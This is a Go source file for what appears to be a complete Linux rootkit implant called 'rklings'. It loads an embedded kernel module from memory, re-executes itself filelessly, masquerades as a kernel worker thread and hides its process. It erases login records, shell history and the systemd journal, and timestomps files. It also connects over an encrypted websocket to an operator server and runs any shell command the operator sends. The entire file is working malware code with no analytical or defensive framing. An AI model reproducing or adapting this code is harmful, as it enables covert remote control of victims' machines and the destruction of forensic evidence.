package main
import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	_ "embed"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
	"unsafe"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
	"golang.org/x/sys/unix"
)

//go:embed keys/agent.key
var agentPrivKey []byte

//go:embed keys/operator.pub
var operatorPubKey []byte

//go:embed rklings.ko
var koBytes []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

var (
	sharedKey     [32]byte
	agentPubBytes []byte
	writeMu       sync.Mutex
	wsConn        *websocket.Conn
)

// utmpRecordSize is the fixed size of a utmp record on Linux amd64.
const utmpRecordSize = 384
const utmpUserOffset = 44
const utmpUserLen = 256

type Command struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

var errCiphertextShort = errors.New("ciphertext too short")

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

func initTransport() {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(agentPrivKey)
	if err != nil {
		log.Fatalf("parse agent key: %v", err)
	}
	agentPubBytes = priv.PublicKey().Bytes()
	sharedKey, _, err = deriveKeys(agentPrivKey, operatorPubKey)
	if err != nil {
		log.Fatalf("derive keys: %v", err)
	}
}

func wsURL() string {
	scheme := "wss"
	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
		scheme = "ws"
	}
	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
}

func wsSend(v any) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsSession() error {
	ctx := context.Background()
	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
	if err != nil {
		return err
	}
	defer conn.CloseNow()
	conn.SetReadLimit(4 << 20)
	wsConn = conn

	hello, _ := json.Marshal(map[string]string{"t": "hello"})
	ct, err := sealAEAD(sharedKey, hello)
	if err != nil {
		return err
	}
	frame := append(agentPubBytes, ct...)
	if err := conn.Write(ctx, websocket.MessageBinary, frame); err != nil {
		return err
	}

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		plain, err := openAEAD(sharedKey, msg)
		if err != nil {
			continue
		}
		var cmd Command
		if json.Unmarshal(plain, &cmd) != nil {
			continue
		}
		result := execute(cmd)
		if err := wsSend(map[string]any{"data": result}); err != nil {
			return err
		}
	}
}

func wsLoop() {
	for {
		if err := wsSession(); err != nil {
			log.Printf("ws: %v", err)
		}
		time.Sleep(jitterDuration(5000, 10000))
	}
}

func main() {
	if err := deploy(); err != nil {
		log.Printf("deploy: %v", err)
	}

	initTransport()
	wsLoop()
}

func execute(cmd Command) any {
	switch cmd.Op {
	case "PING":
		return "PONG"
	case "DEPLOY":
		if err := deploy(); err != nil {
			return fmt.Sprintf("ERR %v", err)
		}
		return "OK"
	case "SHELL":
		return handleShellCmd(cmd.Arg)
	case "STATUS":
		var limit unix.Rlimit
		_ = unix.Getrlimit(unix.RLIMIT_CORE, &limit)
		dumpable, _ := unix.PrctlRetInt(unix.PR_GET_DUMPABLE, 0, 0, 0, 0)
		return fmt.Sprintf("PID=%d UID=%d DUMPABLE=%d CORE=%d PORT=0", os.Getpid(), os.Getuid(), dumpable, limit.Cur)
	default:
		return fmt.Sprintf("ERR unknown: %s", cmd.Op)
	}
}

func handleShellCmd(arg string) any {
	out, err := exec.Command("/bin/sh", "-c", arg).CombinedOutput()
	exitCode := 0
	if err != nil {
		exitCode = -1
		if cmd, ok := err.(*exec.ExitError); ok {
			exitCode = cmd.ExitCode()
		}
	}
	return map[string]any{
		"stdout":    string(out),
		"exit_code": exitCode,
	}
}

// deploy runs the full ghost sequence: load, hide, masquerade, scrub.
func deploy() error {
	if os.Geteuid() != 0 {
		return fmt.Errorf("deployment requires root")
	}

	link, _ := os.Readlink("/proc/self/exe")
	if !strings.Contains(link, "memfd") {
		if err := loadModuleFromMemory(koBytes); err != nil {
			return fmt.Errorf("load module: %w", err)
		}
		trigger("h.m")
		if err := reexecFromMemory(); err != nil {
			return fmt.Errorf("reexec: %w", err)
		}
	}

	// Masquerade as a kernel thread.
	if err := masquerade(); err != nil {
		return fmt.Errorf("masquerade: %w", err)
	}

	hideAll()

	// Scrub all forensic traces.
	if err := scrubAll(); err != nil {
		return fmt.Errorf("scrub: %w", err)
	}

	return nil
}

// loadModuleFromMemory loads a .ko from memory using memfd + finit_module.
func loadModuleFromMemory(ko []byte) error {
	fd, err := unix.MemfdCreate("", unix.MFD_CLOEXEC)
	if err != nil {
		return fmt.Errorf("memfd_create: %w", err)
	}
	defer unix.Close(fd)

	if err := writeAll(fd, ko); err != nil {
		return fmt.Errorf("write ko: %w", err)
	}

	if err := unix.FinitModule(fd, "", 0); err != nil {
		return fmt.Errorf("finit_module: %w", err)
	}

	return nil
}

// reexecFromMemory re-executes this binary from a memfd.
// The original file on disk can be deleted before exec.
func reexecFromMemory() error {
	// Already running from memfd, nothing to do.
	link, err := os.Readlink("/proc/self/exe")
	if err == nil && strings.Contains(link, "memfd") {
		return nil
	}

	self, err := os.ReadFile("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("read self: %w", err)
	}

	// No MFD_CLOEXEC so the fd survives exec.
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return fmt.Errorf("memfd_create: %w", err)
	}

	if err := writeAll(fd, self); err != nil {
		unix.Close(fd)
		return fmt.Errorf("write self: %w", err)
	}

	// Exec replaces this process. Does not return on success.
	return unix.Exec(fmt.Sprintf("/proc/self/fd/%d", fd), os.Args, os.Environ())
}

func writeAll(fd int, data []byte) error {
	for len(data) > 0 {
		n, err := unix.Write(fd, data)
		if err != nil {
			return err
		}
		if n == 0 {
			return io.ErrShortWrite
		}
		data = data[n:]
	}
	return nil
}

func masquerade() error {
	name := [16]byte{}
	copy(name[:], "[kworker/0:1]")
	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
	unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
	unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
	return nil
}

func hideAll() {
	trigger("h.m")
	trigger(fmt.Sprintf("h.i.%d", os.Getpid()))
}

func trigger(command string) {
	path := "rklings." + command
	_ = os.Mkdir(path, 0755)
	_ = os.Remove(path)
}

// scrubAll removes all forensic traces.
func scrubAll() error {
	user := os.Getenv("USER")
	if user == "" {
		user = "root"
	}

	scrubUtmp(user)
	clearHistory()
	timestomp("/tmp", "/etc/hostname")
	tamperJournal()
	os.Clearenv()

	return nil
}

// scrubUtmp removes login records for username from utmp and wtmp.
func scrubUtmp(username string) error {
	files := []string{"/var/run/utmp", "/var/log/wtmp"}
	for _, path := range files {
		f, err := os.OpenFile(path, os.O_RDWR, 0)
		if err != nil {
			continue
		}

		data, err := io.ReadAll(f)
		if err != nil {
			f.Close()
			continue
		}

		modified := false
		for off := 0; off+utmpRecordSize <= len(data); off += utmpRecordSize {
			record := data[off : off+utmpRecordSize]
			if extractUser(record) == username {
				for i := range record {
					record[i] = 0
				}
				modified = true
			}
		}

		if modified {
			f.Seek(0, 0)
			f.Write(data)
		}
		f.Close()
	}
	return nil
}

// clearHistory truncates shell history files.
func clearHistory() error {
	homes := []string{}
	if h, err := os.UserHomeDir(); err == nil {
		homes = append(homes, h)
	}
	if _, err := os.Stat("/root"); err == nil {
		homes = append(homes, "/root")
	}

	for _, home := range homes {
		for _, name := range []string{".bash_history", ".zsh_history"} {
			path := home + "/" + name
			os.Truncate(path, 0)
		}
	}
	return nil
}

// timestomp copies mtime from reference to target.
func timestomp(target, reference string) error {
	info, err := os.Stat(reference)
	if err != nil {
		return fmt.Errorf("stat reference: %w", err)
	}
	mtime := info.ModTime()
	return os.Chtimes(target, mtime, mtime)
}

// tamperJournal vacuums the systemd journal.
func tamperJournal() error {
	exec.Command("/usr/bin/journalctl", "--rotate", "--vacuum-time=1s").Run()
	exec.Command("systemctl", "kill", "--signal=SIGUSR2", "systemd-journald").Run()
	return nil
}

func jitterDuration(minMs, maxMs int) time.Duration {
	var buf [8]byte
	rand.Read(buf[:])
	n := binary.LittleEndian.Uint64(buf[:])
	ms := minMs + int(n%uint64(maxMs-minMs))
	return time.Duration(ms) * time.Millisecond
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// extractUser reads ut_user from a utmp record.
func extractUser(record []byte) string {
	if len(record) < utmpUserOffset+utmpUserLen {
		return ""
	}
	raw := record[utmpUserOffset : utmpUserOffset+utmpUserLen]
	end := bytes.IndexByte(raw, 0)
	if end < 0 {
		end = utmpUserLen
	}
	return string(raw[:end])
}
